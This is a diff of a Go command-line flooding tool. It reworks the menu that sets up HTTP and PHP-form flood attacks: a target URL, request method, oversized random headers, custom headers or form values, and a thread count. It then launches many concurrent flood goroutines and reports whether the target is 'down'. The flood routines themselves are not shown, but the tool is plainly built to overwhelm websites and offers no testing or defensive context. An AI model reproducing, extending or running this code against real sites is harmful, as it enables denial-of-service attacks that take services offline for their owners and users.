@@ -16,6 +16,7 @@ import (
 
 func main() {
 
+	var ToolType string = "FLOOD"
 	var FloodMethod string = "HTTP"
 
 	var URL string
@@ -38,113 +39,124 @@ func main() {
 
 	fmt.Println("=============================================================")
 	fmt.Println(" due to golang fmt.scanln please don't make spaces in input!")
-	fmt.Println("=============================================================")
+	fmt.Println(" if you are using scan function please type it without using")
+	fmt.Println(" any of other simbols than numbers and dots '.' ")
+	fmt.Print("=============================================================\n\n\n\n")
 
-	fmt.Print("Flood method [php/HTTP] - ")
-	fmt.Scanln(&FloodMethod)
+	fmt.Print("Tool [FLOOD] -> ")
+	fmt.Scanln(&ToolType)
 
-	if strings.ToLower(FloodMethod) == "http" {
-		fmt.Print("Website URL <STRING> - ")
-		fmt.Scanln(&URL)
-		fmt.Print("HTTP Method <STRING> - ")
-		fmt.Scanln(&Method)
-		fmt.Print("Headers per request <INT> - ")
-		fmt.Scanln(&HPR)
-		fmt.Print("Header size (random ascii char) <INT> - ")
-		fmt.Scanln(&HeaderSizeChar)
-		fmt.Printf("Custom headers [y/N] -> ")
-		fmt.Scanln(&CustomHeaders)
+	if strings.ToLower(ToolType) == "flood" {
 
-		if strings.ToLower(CustomHeaders) == "y" {
-			fmt.Print("\n")
-			for {
-				fmt.Print("Header name <STRING> - ")
-				fmt.Scanln(&CustomHeaderName)
-				fmt.Print("Header content <STRING> - ")
-				fmt.Scanln(&CustomHeaderBody)
+		fmt.Print("Flood method [php/HTTP] - ")
+		fmt.Scanln(&FloodMethod)
 
-				HeadersName = append(HeadersName, CustomHeaderName)
-				HeadersCont = append(HeadersCont, CustomHeaderBody)
-				fmt.Print("Do you want to add next header? [y/N] -> ")
-				DoNextCustomHeader = "N"
-				fmt.Scanln(&DoNextCustomHeader)
+		if strings.ToLower(FloodMethod) == "http" {
+			fmt.Print("Website URL <STRING> - ")
+			fmt.Scanln(&URL)
+			fmt.Print("HTTP Method <STRING> - ")
+			fmt.Scanln(&Method)
+			fmt.Print("Headers per request <INT> - ")
+			fmt.Scanln(&HPR)
+			fmt.Print("Header size (random ascii char) <INT> - ")
+			fmt.Scanln(&HeaderSizeChar)
+			fmt.Printf("Custom headers [y/N] -> ")
+			fmt.Scanln(&CustomHeaders)
 
-				if strings.ToLower(DoNextCustomHeader) == "n" {
-					break
-				} else {
-					fmt.Print("\n")
+			if strings.ToLower(CustomHeaders) == "y" {
+				fmt.Print("\n")
+				for {
+					fmt.Print("Header name <STRING> - ")
+					fmt.Scanln(&CustomHeaderName)
+					fmt.Print("Header content <STRING> - ")
+					fmt.Scanln(&CustomHeaderBody)
+
+					HeadersName = append(HeadersName, CustomHeaderName)
+					HeadersCont = append(HeadersCont, CustomHeaderBody)
+					fmt.Print("Do you want to add next header? [y/N] -> ")
+					DoNextCustomHeader = "N"
+					fmt.Scanln(&DoNextCustomHeader)
+
+					if strings.ToLower(DoNextCustomHeader) == "n" {
+						break
+					} else {
+						fmt.Print("\n")
+					}
 				}
+
 			}
-
-		}
-	} else if strings.ToLower(FloodMethod) == "php" {
-		fmt.Print("Website URL <STRING> (link to php) - ")
-		fmt.Scanln(&URL)
-		fmt.Print("php form name <STRING> - ")
-		fmt.Scanln(&CustomHeaderName)
-		fmt.Print("php form content <STRING> - ")
-		fmt.Scanln(&CustomHeaderBody)
-
-		HeadersName = append(HeadersName, CustomHeaderName)
-		HeadersCont = append(HeadersCont, CustomHeaderBody)
-
-		fmt.Print("do you want do add another php value? [y/N] -> ")
-		fmt.Scanln(&DoNextCustomHeader)
-
-		for strings.ToLower(DoNextCustomHeader) == "y" {
-			DoNextCustomHeader = "N"
-			fmt.Print("\n\nphp form header <STRING> - ")
+		} else if strings.ToLower(FloodMethod) == "php" {
+			fmt.Print("Website URL <STRING> (link to php) - ")
+			fmt.Scanln(&URL)
+			fmt.Print("php form name <STRING> - ")
 			fmt.Scanln(&CustomHeaderName)
-			fmt.Print("\nphp form content <STRING> - ")
+			fmt.Print("php form content <STRING> - ")
 			fmt.Scanln(&CustomHeaderBody)
 
 			HeadersName = append(HeadersName, CustomHeaderName)
 			HeadersCont = append(HeadersCont, CustomHeaderBody)
 
-			fmt.Print("\ndo you want do add another php value? [y/N] ->")
+			fmt.Print("do you want do add another php value? [y/N] -> ")
 			fmt.Scanln(&DoNextCustomHeader)
+
+			for strings.ToLower(DoNextCustomHeader) == "y" {
+				DoNextCustomHeader = "N"
+				fmt.Print("\n\nphp form header <STRING> - ")
+				fmt.Scanln(&CustomHeaderName)
+				fmt.Print("\nphp form content <STRING> - ")
+				fmt.Scanln(&CustomHeaderBody)
+
+				HeadersName = append(HeadersName, CustomHeaderName)
+				HeadersCont = append(HeadersCont, CustomHeaderBody)
+
+				fmt.Print("\ndo you want do add another php value? [y/N] ->")
+				fmt.Scanln(&DoNextCustomHeader)
+			}
+
+		} else {
+			os.Exit(0)
 		}
 
-	} else {
-		os.Exit(1)
-	}
+		fmt.Print("Show Only DownInfo? [y/N] -> ")
+		fmt.Scanln(&SHOWONLYDOWN)
+		fmt.Print("Show website output? [y/N] ->")
+		fmt.Scanln(&SHOWOUTPUT)
+		fmt.Print("Threads <INT> - ")
+		fmt.Scanln(&Threads)
 
-	fmt.Print("Threads <INT> - ")
-	fmt.Scanln(&Threads)
-	fmt.Print("Show Only DownInfo? [y/N] -> ")
-	fmt.Scanln(&SHOWONLYDOWN)
-	fmt.Print("Show website output? [y/N] ->")
-	fmt.Scanln(&SHOWOUTPUT)
+		fmt.Print("\n\n\n=============================================================\n")
+		fmt.Println("Flood method     = " + FloodMethod)
 
-	fmt.Print("\n\n\n=============================================================\n")
-	fmt.Println("Flood method     = " + FloodMethod)
-
-	if strings.ToLower(FloodMethod) == "http" {
-		fmt.Println("URL              = " + URL)
-		fmt.Println("method           = " + Method)
-		fmt.Printf("Threads          = %d \n", Threads)
-		fmt.Printf("HPR              = %d \n", HPR)
-		fmt.Printf("Header size      = %d \n\n", +HeaderSizeChar)
-		fmt.Println("Log only down     = " + SHOWONLYDOWN)
-	} else if strings.ToLower(FloodMethod) == "php" {
-		fmt.Println("PHP URL          = " + URL)
-		fmt.Printf("Threads          = %d \n\n", Threads)
-		fmt.Println("Log only down    = " + SHOWONLYDOWN)
-	}
-	fmt.Print("============================================================= \n")
-	fmt.Printf("confirm [Y/n] -> ")
-	fmt.Scanln(&confirmed)
-	var i int
-
-	if strings.ToLower(confirmed) == "y" {
 		if strings.ToLower(FloodMethod) == "http" {
-			for i = 0; i < Threads; i++ {
-				go HTTP_FLOOD(URL, Method, HeaderSizeChar, HPR, SHOWONLYDOWN, HeadersName, HeadersCont, SHOWOUTPUT)
-			}
+			fmt.Println("URL              = " + URL)
+			fmt.Println("method           = " + Method)
+			fmt.Printf("Threads          = %d \n", Threads)
+			fmt.Printf("HPR              = %d \n", HPR)
+			fmt.Printf("Header size      = %d \n\n", +HeaderSizeChar)
+			fmt.Println("Log only down     = " + SHOWONLYDOWN)
 		} else if strings.ToLower(FloodMethod) == "php" {
-			for i = 0; i < Threads; i++ {
-				go PHP_FLOOD(URL, SHOWONLYDOWN, HeadersName, HeadersCont, SHOWOUTPUT)
+			fmt.Println("PHP URL          = " + URL)
+			fmt.Printf("Threads          = %d \n\n", Threads)
+			fmt.Println("Log only down    = " + SHOWONLYDOWN)
+		}
+		fmt.Print("============================================================= \n")
+		fmt.Printf("confirm [Y/n] -> ")
+		fmt.Scanln(&confirmed)
+
+		var i int
+		if strings.ToLower(confirmed) == "y" {
+			if strings.ToLower(FloodMethod) == "http" {
+				for i = 0; i < Threads; i++ {
+					go HTTP_FLOOD(URL, Method, HeaderSizeChar, HPR, SHOWONLYDOWN, HeadersName, HeadersCont, SHOWOUTPUT)
+				}
+			} else if strings.ToLower(FloodMethod) == "php" {
+				for i = 0; i < Threads; i++ {
+					go PHP_FLOOD(URL, SHOWONLYDOWN, HeadersName, HeadersCont, SHOWOUTPUT)
+				}
 			}
+
+		} else {
+			os.Exit(0)
 		}
 
 	} else {
@@ -158,15 +170,17 @@ func main() {
 	for {
 		<-c
 
-		fmt.Print("\n\n\n=============================================================\n")
+		if strings.ToLower(ToolType) == "flood" {
+			fmt.Print("\n\n\n=============================================================\n")
 
-		fmt.Println("Used flood method        - ", FloodMethod)
-		fmt.Println("Runtime                  - ", time.Now().Sub(StartedAt), "\n")
-		fmt.Println("Done rCode:200 requests  - ", FinishDone200)
-		fmt.Println("Dome rCode!200 requests  - ", FinishNot200)
-		fmt.Println("request summary          - ", FinishDone200+FinishNot200)
+			fmt.Println("Used flood method        - ", FloodMethod)
+			fmt.Println("Runtime                  - ", time.Now().Sub(StartedAt), "\n")
+			fmt.Println("Done rCode:200 requests  - ", FinishDone200)
+			fmt.Println("Dome rCode!200 requests  - ", FinishNot200)
+			fmt.Println("request summary          - ", FinishDone200+FinishNot200)
 
-		fmt.Print("=============================================================\n")
+			fmt.Print("=============================================================\n")
+		}
 
 		os.Exit(0)
 	}
@@ -180,6 +194,8 @@ func RandStringRunes(n int) string {
 	}
 	return string(b)
 }
+
+// flood
 
 var LastRespond time.Time
 
@@ -280,3 +296,4 @@ var FinishDone200 int64 = 0
 var FinishNot200 int64 = 0
 
 var FinishRoutine bool = false
+var IPlist []string
